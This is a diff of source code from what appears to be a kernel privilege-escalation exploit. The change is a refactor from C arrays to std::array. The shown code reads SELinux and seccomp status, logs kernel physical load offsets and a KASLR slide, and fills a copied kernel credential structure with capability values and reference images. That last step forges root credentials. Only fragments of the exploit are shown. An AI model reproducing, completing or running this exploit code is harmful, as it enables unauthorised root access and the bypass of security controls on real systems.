@@ -1,5 +1,7 @@
 #include "common.h"
 #include "runtime_struct_offsets.h"
+
+#include <array>
 #include "session/exploit_session.hpp"
 #include "support/native_resource.hpp"
 #include "target.h"
@@ -71,37 +73,45 @@ void read_first_line(const char *path, char *buf, size_t len) {
 /* Decoupling plan: log a captured runtime configuration. Input: RuntimeConfig;
  * output: diagnostics only. Future: runtime_config_log(const RuntimeConfig *). */
 void log_startup_context(void) {
-  char attr[256];
-  char enforce[32];
-  char status[4096];
-  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
-  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
-  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
+  std::array<char, 256> attr{};
+  std::array<char, 32> enforce{};
+  std::array<char, 4096> status{};
+  std::array<char, 160> limits{};
+  snprintf(limits.data(), limits.size(),
+          "NoNewPrivs=? Seccomp=? Seccomp_filters=?");
+  read_first_line("/proc/self/attr/current", attr.data(), attr.size());
+  read_first_line("/sys/fs/selinux/enforce", enforce.data(), enforce.size());
   int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
   if (fd >= 0) {
-    ssize_t n = read(fd, status, sizeof(status) - 1);
+    ssize_t n = read(fd, status.data(), status.size() - 1);
     close(fd);
     if (n > 0) {
-      status[n] = 0;
-      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
-      char values[3][32] = {"?", "?", "?"};
-      for (size_t i = 0; i < 3; i++) {
-        char *p = strstr(status, names[i]);
+      status[static_cast<size_t>(n)] = 0;
+      const std::array<const char *, 3> names = {
+              "NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
+      std::array<std::array<char, 32>, 3> values = {{
+              std::array<char, 32>{"?"},
+              std::array<char, 32>{"?"},
+              std::array<char, 32>{"?"},
+      }};
+      for (size_t i = 0; i < names.size(); i++) {
+        char *p = strstr(status.data(), names[i]);
         if (p) {
           p += strlen(names[i]);
           while (*p == '\t' || *p == ' ') {
             p++;
           }
           size_t len = strcspn(p, "\r\n");
-          if (len >= sizeof(values[i])) {
-            len = sizeof(values[i]) - 1;
+          if (len >= values[i].size()) {
+            len = values[i].size() - 1;
           }
-          memcpy(values[i], p, len);
+          memcpy(values[i].data(), p, len);
           values[i][len] = 0;
         }
       }
-      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
-               "Seccomp_filters=%s", values[0], values[1], values[2]);
+      snprintf(limits.data(), limits.size(), "NoNewPrivs=%s Seccomp=%s "
+               "Seccomp_filters=%s", values[0].data(), values[1].data(),
+               values[2].data());
     }
   }
   struct timespec boot;
@@ -111,8 +121,8 @@ void log_startup_context(void) {
   pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u "
              "boot_ms=%.0f attr=%s enforce=%s\n",
              getpid(), getuid(), geteuid(), getgid(), getegid(), boot_ms,
-             attr, enforce);
-  pr_success("startup limits pid=%d %s\n", getpid(), limits);
+             attr.data(), enforce.data());
+  pr_success("startup limits pid=%d %s\n", getpid(), limits.data());
   pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
              getpid(), BUILD_VARIANT_LABEL);
   pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
@@ -193,11 +203,11 @@ static int fill_profile_cred_copy(unsigned char *p, size_t off) {
     put64(c, v->cred_caps_offset + i * sizeof(uint64_t), v->cred_caps_value);
   }
 
-  const uint32_t ref_offsets[] = {
+  const std::array<uint32_t, 4> ref_offsets = {
       v->cred_ref0_offset, v->cred_ref1_offset,
       v->cred_ref2_offset, v->cred_ref3_offset,
   };
-  const uint64_t ref_images[] = {
+  const std::array<uint64_t, 4> ref_images = {
       v->cred_ref0_image, v->cred_ref1_image,
       v->cred_ref2_image, v->cred_ref3_image,
   };
